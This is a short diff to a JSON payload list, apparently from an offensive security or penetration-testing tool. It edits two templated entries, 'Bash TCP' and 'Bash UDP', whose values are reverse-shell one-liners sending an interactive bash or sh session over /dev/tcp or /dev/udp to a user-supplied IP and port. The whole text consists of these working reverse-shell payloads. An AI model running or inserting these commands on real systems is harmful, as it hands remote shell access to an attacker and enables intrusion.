@@ -1118,7 +1118,7 @@
             "values": [
                 {
                     "name": "Bash TCP",
-                    "value": "bash -i >& /dev/tcp/§IP§/§PORT§ 0>&1",
+                    "value": "bash -i 5<>/dev/tcp/§IP§/§PORT§ 0<&5 1>&5 2>&5",
                     "prompt": [
                         "IP",
                         "PORT"
@@ -1126,7 +1126,7 @@
                 },
                 {
                     "name": "Bash UDP",
-                    "value": "sh -i >& /dev/udp/§IP§/§PORT§ 0>&1",
+                    "value": "sh -i 5<>/dev/udp/§IP§/§PORT§ 0<&5 1>&5 2>&5",
                     "prompt": [
                         "IP",
                         "PORT"
